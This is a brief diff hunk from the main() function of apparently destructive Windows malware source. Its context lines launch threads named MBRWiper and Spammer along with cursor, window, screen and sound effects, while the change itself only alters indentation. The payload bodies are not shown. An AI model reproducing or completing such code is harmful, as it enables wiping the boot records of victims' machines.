@@ -270,8 +270,8 @@ int main()
 			CreateThread(NULL, 0, MBRWiper, NULL, 0, 0);
 			Sleep(5000);
 			CreateThread(NULL, 0, Spammer, NULL, 0, 0);
-	    CreateThread(NULL, 0, SetRandCursorPos, NULL, 0, 0);
-	    CreateThread(NULL, 0, SetBounceWndPos, NULL, 0, 0);
+	                CreateThread(NULL, 0, SetRandCursorPos, NULL, 0, 0);
+	                CreateThread(NULL, 0, SetBounceWndPos, NULL, 0, 0);
 			HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
 			sound1();
 			Sleep(30000);
